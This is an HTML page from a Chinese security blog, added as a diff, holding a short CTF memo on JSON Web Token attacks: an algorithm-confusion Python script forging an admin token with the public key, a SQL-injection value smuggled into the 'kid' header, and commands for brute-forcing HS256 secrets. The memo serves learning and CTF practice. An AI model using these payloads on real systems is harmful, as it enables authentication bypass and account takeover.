@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            JWT备忘录
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-JSON-Web-Token"><span class="toc-text">JWT (JSON Web Token)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%B3%95%E4%BF%AE%E6%94%B9%E6%94%BB%E5%87%BB"><span class="toc-text">算法修改攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header%E5%A4%B4%E4%B8%AD%E5%AD%98%E5%9C%A8kid%E5%AD%97%E6%AE%B5"><span class="toc-text">Header头中存在kid字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4"><span class="toc-text">密钥爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这一段时间遇到两次JWT的CTF题，本想好好整理一下，结果搜到一篇文章把我想整理的全写出来了。</p>
+<p>文章地址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/145540">https://www.anquanke.com/post/id/145540</a></p>
+<p>所以这里就只作为一个备忘录，简单总结一下。</p>
+<a id="more"></a>
+<h2 id="JWT-JSON-Web-Token"><a href="#JWT-JSON-Web-Token" class="headerlink" title="JWT (JSON Web Token)"></a>JWT (JSON Web Token)</h2><p>最常用的网址：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>JWT由三部分组成：Header(头部), Payload(负载), Signature(签名)</p>
+<pre><code>格式为：
+Header.Payload.Signature
+
+例如：(HS256)
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+或 (RS256)
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.POstGetfAytaZS82wHcjoTyoqhMyxXiWdR7Nn7A29DNSl0EiXLdwJ6xC6AfgZWF1bOsS_TuYI3OG85AmiExREkrS6tDfTQ2B3WXlrr-wp5AokiRbz3_oB4OxG-W9KcEEbDRcZc0nH3L7LzYptiy1PtAylQGxHTWZXtGz4ht0bAecBgmpdgXMguEIcoqPJ1n3pIWk_dUZegpqx0Lka21H6XxUTxiy8OcaarA8zdnPUnV6AmNP3ecFawIFYdvJB_cm-GvpCSbr8G8y_Mllj8f4x9nBH8pQux89_6gUY618iYv7tuPWBFfEbLxtF2pZS6YC1aSfLQxeNe8djT9YjpvRZA</code></pre>
+<p>Header:</p>
+<pre><code>&#123;
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+&#125;
+
+alg属性表示签名的算法 (默认是 HMAC SHA256 即HS256)
+typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT</code></pre>
+<p>Payload:</p>
+<pre><code>&#123;
+  &quot;sub&quot;: &quot;1234567890&quot;,
+  &quot;name&quot;: &quot;John Doe&quot;,
+  &quot;admin&quot;: true
+&#125;
+
+除了官方字段，还可以添加自定义字段。如这里的admin字段就是自定义字段。</code></pre>
+<p>Signature:</p>
+<pre><code>Signature 部分是对前两部分的签名，防止数据篡改。
+
+服务器使用一个指定的密钥，按照下面的签名算法(默认为HS256)产生签名
+(RS256有一个公钥和一个私钥)
+
+HMACSHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  secret)
+
+RSASHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  PUBLIC KEY, PRIVATE KEY)</code></pre>
+<p>然后将这三个部分分别base64编码后用“.”连接生成JSON Web Token</p>
+<p>话说文章里面的名字取的还蛮不错的。</p>
+<h3 id="算法修改攻击"><a href="#算法修改攻击" class="headerlink" title="算法修改攻击"></a>算法修改攻击</h3><p>条件：</p>
+<pre><code>JWT使用RS256攻击
+公钥可知
+不可解密私钥(怎么解密也不知道)</code></pre>
+<p>利用：</p>
+<p>将公钥作为HS256的密钥</p>
+<p>使用python脚本生成(用jwt.io生成的用不了)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>,<span class="string">&quot;priv&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;, key=public, algorithm=<span class="string">&#x27;HS256&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>报错请参考文章内的解决办法</p>
+<h3 id="Header头中存在kid字段"><a href="#Header头中存在kid字段" class="headerlink" title="Header头中存在kid字段"></a>Header头中存在kid字段</h3><p>通过key查询私钥的语句类似于：</p>
+<pre><code>sql=&quot;select * from table where kid=$kid&quot;</code></pre>
+<p>将kid修改为：</p>
+<pre><code>kid = 0 union select 12345</code></pre>
+<p>根据环境情况修改kid的值，目的是得到或者控制私钥。</p>
+<pre><code>openssl常用命令
+
+//生成私钥
+openssl
+OpenSSL&gt; genrsa -out rsa_private_key.pem 1024 
+//产生公钥
+OpenSSL&gt; rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem writing RSA key</code></pre>
+<h3 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h3><p>HS256可以尝试一下爆破</p>
+<pre><code>工具： https://github.com/brendan-rius/c-jwt-cracker
+
+使用： ./jwtcrack 加密值</code></pre>
+<p>使用字典爆破</p>
+<pre><code>工具： https://github.com/Sjord/jwtcrack
+
+使用： crackjwt.py JWT dictionary.txt</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/145540">https://www.anquanke.com/post/id/145540</a></li>
+<li><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
